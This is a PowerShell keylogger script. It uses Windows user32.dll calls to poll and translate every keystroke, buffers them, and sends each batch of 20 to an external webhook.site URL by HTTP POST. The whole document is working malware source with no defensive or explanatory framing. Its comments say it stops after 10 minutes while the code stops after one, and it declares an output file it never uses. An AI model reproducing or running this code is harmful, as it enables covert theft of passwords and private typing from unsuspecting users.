# Signatures for Windows API calls
$signatures = @'
    [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
    public static extern short GetAsyncKeyState(int virtualKeyCode);
    [DllImport("user32.dll", CharSet=CharSet.Auto)]
    public static extern int GetKeyboardState(byte[] keystate);
    [DllImport("user32.dll", CharSet=CharSet.Auto)]
    public static extern int MapVirtualKey(uint uCode, int uMapType);
    [DllImport("user32.dll", CharSet=CharSet.Auto)]
    public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

# Load signatures and make members available
$API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru

if ($null -eq $API) {
    Write-Host "Failed to load Windows API functions."
    exit
}

$outputFilePath = "C:\Users\keylog.txt"
$webhookUrl = "https://webhook.site/b50f8a1c-71e5-4db0-b3f3-9045b4421393"
$keyCount = 0
$keyBuffer = @()
$startTime = Get-Date

# Loop to capture key presses
while ($true) {
    # Check if 10 minutes elapsed
    if ((Get-Date) -ge ($startTime.AddMinutes(1))) {
        Write-Host "10 minutes elapsed. Stopping keylogger."
        break
    }

    # Scan all ASCII codes above 8
    for ($ascii = 9; $ascii -le 254; $ascii++) {
        # Get current key state
        $state = $API::GetAsyncKeyState($ascii)

        # Is key pressed?
        if ($state -eq -32767) {
            # Translate scan code to real code
            $virtualKey = $API::MapVirtualKey($ascii, 3)

            # Get keyboard state for virtual keys
            $kbstate = New-Object Byte[] 256
            $checkkbstate = $API::GetKeyboardState($kbstate)

            # Prepare a StringBuilder to receive input key
            $mychar = New-Object -TypeName System.Text.StringBuilder

            # Translate virtual key
            $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)

            if ($success) {
                # Add key to buffer
                $keyBuffer += $mychar.ToString()
                $keyCount++

                # Check if 20 key presses reached
                if ($keyCount -eq 20) {
                    # Convert key buffer to string
                    $keyBufferString = $keyBuffer -join "`r`n"

                    # Send captured text to webhook
                    Invoke-WebRequest -Uri $webhookUrl -Method POST -Body $keyBufferString -ContentType "text/plain"

                    Write-Host "Data sent to webhook."

                    # Reset key count and buffer
                    $keyCount = 0
                    $keyBuffer = @()
                }
            }
        }
    }

    Start-Sleep -Milliseconds 40
}

Write-Host "Keylogger stopped."
